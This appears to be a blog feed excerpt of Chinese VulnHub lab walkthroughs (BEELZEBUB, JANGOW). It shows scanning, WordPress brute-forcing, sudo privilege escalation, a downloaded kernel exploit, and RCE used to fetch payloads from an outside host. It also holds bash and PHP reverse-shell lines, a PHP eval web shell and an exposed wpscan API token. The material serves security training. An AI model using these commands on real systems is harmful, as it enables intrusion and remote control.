&lt;p&gt;sudo -l 查看 thor 的权限设置，发现其可以直接无密码调用 root 的 service&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v&#34;&gt;https://gtfobins.github.io/&lt;/span&gt; 上找到了 service 的提权命令&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;service 提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo service ../../bin/sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-454.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 提权成功最终拿到了 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/120%20BEELZEBUB/</guid>
            <title>VULNHUB 20 BEELZEBUB</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/120%20BEELZEBUB/</link>
            <category>VULNHUB 11-20</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYmVlbHplYnViLTEsNzQyLw==&#34;&gt;https://www.vulnhub.com/entry/beelzebub-1,742/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU2NzkwNjcuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15679067.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 BEELZEBUB：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-455.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.102&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.102&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-456.png&#34; width=&#34;410&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAy&#34;&gt;http://192.168.31.102&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-457.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.102&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;gobuster dir -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.102&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-458.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyL3BocG15YWRtaW4vZG9jL2h0bWwvaW5kZXguaHRtbA==&#34;&gt;http://192.168.31.102/phpmyadmin/doc/html/index.html&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-459.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyL3BocG15YWRtaW4v&#34;&gt;http://192.168.31.102/phpmyadmin/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-460.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyL3BocGluZm8ucGhw&#34;&gt;http://192.168.31.102/phpinfo.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-461.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并没有发现可以直接利用的漏洞，用 dirb 做更深的目录结构扫描&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-462.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 还是没有什么发现&lt;/p&gt;
&lt;h3 id=&#34;源代码信息检索&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#源代码信息检索&#34;&gt;#&lt;/a&gt; 源代码信息检索&lt;/h3&gt;
&lt;p&gt;对已经存在的网址进行源代码的审查: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyL2luZGV4LnBocA==&#34;&gt;http://192.168.31.102/index.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-463.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;猜测这句话的意思是原本存在目录结构为 beelzebub 的目录，为了防止被攻击，将此目录结构以 md5 加密，所以会有一个 beelzebub 的 md5 加密后的目录&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-464.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;判断猜测是否正确，搜寻此目录下是否存在其他文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.102/d18e1e22becbd915b45e0e655429d487&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-465.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;根据目录结构中的许多关键词如 wp 可以判断出这是一个二级 wordpress 站点&lt;br&gt;
 wp-login.php 进入到登陆界面，发现一直在转圈&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-466.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;wpscan-强制扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wpscan-强制扫描&#34;&gt;#&lt;/a&gt; wpscan 强制扫描&lt;/h3&gt;
&lt;p&gt;通过 wpscan 工具来对网站进行一波用户名的枚举&lt;/p&gt;
&lt;p&gt;&lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/ --e&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-467.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;wpscan 扫描失败，根据提示加上对应的参数扫描&lt;br&gt;
 &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/ --enumerate u --ignore-main-redirect&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-468.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;wpscan 扫描仍然失败，提示的是未检测到此 CMS，加 force 强制扫描&lt;br&gt;
 &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487 --enumerate u --ignore-main-redirect --force&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-469.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 开始正常扫描，枚举出了两个用户名 valak 和 krampus&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-470.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过已有的用户名来爆破密码&lt;br&gt;
 &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/ -U &#39;valak,krampus&#39; -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --ignore-main-redirect --force&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-471.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 密码破解失败，无法获取到密码，将从其他 url 地址上寻找突破&lt;/p&gt;
&lt;h3 id=&#34;cookie-密码泄漏&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cookie-密码泄漏&#34;&gt;#&lt;/a&gt; cookie 密码泄漏&lt;/h3&gt;
&lt;p&gt;继续访问前边扫描到的 url 地址，看是否有可疑目录&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyL2QxOGUxZTIyYmVjYmQ5MTViNDVlMGU2NTU0MjlkNDg3L3dwLWNvbnRlbnQvdXBsb2Fkcy8=&#34;&gt; http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-472.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyL2QxOGUxZTIyYmVjYmQ5MTViNDVlMGU2NTU0MjlkNDg3L3dwLWNvbnRlbnQvdXBsb2Fkcy9UYWxrJTIwVG8lMjBWQUxBSy8=&#34;&gt;http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/Talk To VALAK/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-473.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到一个可以输入语句的对话框，在这里输入个用户名试试什么效果&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-474.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;输入用户名后，网站的 cookie 信息中爆出来了一个密码；切换用户，输入 krampus 用户，查看到了他的密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-475.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; valak：M4k3Ad3a1 krampus：M4k3Ad3a1&lt;/p&gt;
&lt;p&gt;用 ssh 尝试这两个用户的登录名和密码，进入服务器&lt;br&gt;
 &lt;code&gt;ssh 192.168.31.102 -l valak&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;ssh 192.168.31.102 -l krampus&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-476.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 krampus 的权限，进入到了服务器&lt;/p&gt;
&lt;h3 id=&#34;bash_history-查看&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bash_history-查看&#34;&gt;#&lt;/a&gt; .bash_history 查看&lt;/h3&gt;
&lt;p&gt;cat ~/.bash_history 查看历史命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-477.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到之前有操作过这些命令，很有可能就是提权命令，复现此 exp&lt;br&gt;
 &lt;code&gt;wget http://www.exploit-db.com/download/47009&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-478.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用exp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mv 47009 ./exp.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gcc exp.c -o exp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./exp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-479.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 提权成功，拿到了 root 账户的权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/118%20JANGOW/</guid>
            <title>VULNHUB 18 JANGOW</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/118%20JANGOW/</link>
            <category>VULNHUB 11-20</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvamFuZ293LTEwMSw3NTQv&#34;&gt;https://www.vulnhub.com/entry/jangow-101,754/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2t1a3VkZXNodW8vYXJ0aWNsZS9kZXRhaWxzLzEyMjk3NzkxNw==&#34;&gt;https://blog.csdn.net/kukudeshuo/article/details/122977917&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 JANGOW：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-388.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;不同的设备会表现出不同的 MAC 地址，这里没有显示出两个相同的 MAC 地址，不好判断哪个才是真正的靶机地址&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;确认承载靶机的win机器的MAC地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ipconfig /all | find “物理地址”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-389.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;通过比较上述两个图可以发现 A0-D3-7A-07-9E-8C 是 win 机器的 MAC 地址，而位于 win 机器上的靶机应该跟 win 主机享有同样的 MAC 地址，因此可以确定目标靶机的 ip 地址为 27&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.27&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-390.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21, 80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjc=&#34;&gt;http://192.168.31.27&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-391.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;先对目标网站进行目录扫描&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.27/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-392.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,txt,html,zip,rar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.27/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-393.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 只出现了一个目录 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZQ==&#34;&gt;http://192.168.31.27/site&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-394.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对这个网站可以点击的地方进行了检查，发现存在下面这个 url 地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj0=&#34;&gt;http://192.168.31.27/site/busque.php?buscar=&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-395.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;疑似是一个后门文件，尝试进行 rce 注入&lt;/p&gt;
&lt;h3 id=&#34;rce漏洞反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rce漏洞反弹shell&#34;&gt;#&lt;/a&gt; RCE 漏洞反弹 shell&lt;/h3&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-396.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;RCE 漏洞存在，接下来通过这个地方进行反弹 shell，先判断目标服务器是否存在下列可以用来反弹 shell 的命令，可以用 curl bash php 来反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj13aGljaCUyMGN1cmw7d2hpY2glMjBiYXNoO3doaWNoJTIwcHl0aG9uO3doaWNoJTIwcGhwOw==&#34;&gt;http://192.168.31.27/site/busque.php?buscar=which curl;which bash;which python;which php;&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-397.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 wget 来下马，并查看是否将文件下载到了目标服务器上&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj13Z2V0JTIwaHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwuc2g7bHM=&#34;&gt; http://192.168.31.27/site/busque.php?buscar=wget http://www.chentuo.asia/shell.sh;ls&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-398.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现并没有文件被上传上去&lt;/p&gt;
&lt;h3 id=&#34;rce漏洞绕过方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rce漏洞绕过方式&#34;&gt;#&lt;/a&gt; RCE 漏洞绕过方式&lt;/h3&gt;
&lt;p&gt;思考是否是因为 sh 脚本的原因，换成 php 文件尝试下载&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj13Z2V0JTIwaHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwucGhwO2xz&#34;&gt;http://192.168.31.27/site/busque.php?buscar=wget http://www.chentuo.asia/shell.php;ls&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-399.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现 php 文件也无法被上传上去&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;直接通过bash反弹shell 的命令在url地址上执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1iYXNoJTIwLWMlMjAlMjdiYXNoJTIwLWklMjAlM0UmYW1wOyUyMC9kZXYvdGNwLzE5Mi4xNjguMzEuMTM1LzQ0NDQlMjAwJTNFJmFtcDsxJTI3&#34;&gt;http://192.168.31.27/site/busque.php?buscar=bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&#39;&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-400.png&#34;&gt;
&lt;p&gt;直接通过 bash 反弹也是失败的，尝试通过 php 的代码来反弹&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php -r &amp;#x27;$sock=fsockopen(&amp;quot;192.168.31.135&amp;quot;,4444);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&amp;#x27;http://192.168.31.27/site/busque.php?buscar=php%20-r%20%27$sock=fsockopen(%22192.168.31.135%22,4444);exec(%22/bin/sh%20-i%20%3C&amp;amp;3%20%3E&amp;amp;3%202%3E&amp;amp;3%22);%27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-401.png&#34;&gt;
&lt;p&gt;php 反弹 shell 也被服务器拒绝，下面通过 echo 来给服务器上写文件，看是否能写上文件  &lt;code&gt;echo “1” &amp;gt; 1.php;ls&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1lY2hvJTIwJTIyMSUyMiUzRTEucGhwO2xz&#34;&gt;http://192.168.31.27/site/busque.php?buscar=echo &amp;quot;1&amp;quot;&amp;gt;1.php;ls&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-402.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 可以写文件，那么就尝试可以写后门&lt;/p&gt;
&lt;h3 id=&#34;echo-后门至服务器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#echo-后门至服务器&#34;&gt;#&lt;/a&gt; echo 后门至服务器&lt;/h3&gt;
&lt;p&gt;通过 echo 将 bash 反弹的代码写到目标服务器上&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1lY2hv&#34;&gt;http://192.168.31.27/site/busque.php?buscar=echo&lt;/span&gt; “bash -c ‘bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1’” &amp;gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEuc2g=&#34;&gt;1.sh&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-403.png&#34;&gt;
&lt;p&gt;写入失败，页面无反应，看来不能写 sh 文件，还得写 php 文件&lt;/p&gt;
&lt;p&gt;写一个 php 一句话后门，判断是否能写上&lt;/p&gt;
&lt;p&gt;echo ‘&lt;?php @eval($_POST[&#39;x&#39;]); ?&gt;’ &amp;gt;attack.php &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1lY2hvJTIwJTI3JTNDP3BocCUyMEBldmFsKCRfUClPU1QlNUIlMjd4JTI3JTVE&#34;&gt;http://192.168.31.27/site/busque.php?buscar=echo &#39;&amp;lt;?php @eval($_P)OST[‘x’]&lt;/span&gt;);%20?%3E%27%20%3E%20attack.php;ls&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-404.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; php 一句话后门写入成功&lt;/p&gt;
&lt;p&gt;查看写的文件是否完整&lt;/p&gt;
&lt;p&gt;view-source:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjcvc2l0ZS9idXNxdWUucGhwP2J1c2Nhcj1jYXQlMjBhdHRhY2sucGhw&#34;&gt;http://192.168.31.27/site/busque.php?buscar=cat attack.php&lt;/span&gt;&lt;/p&gt;
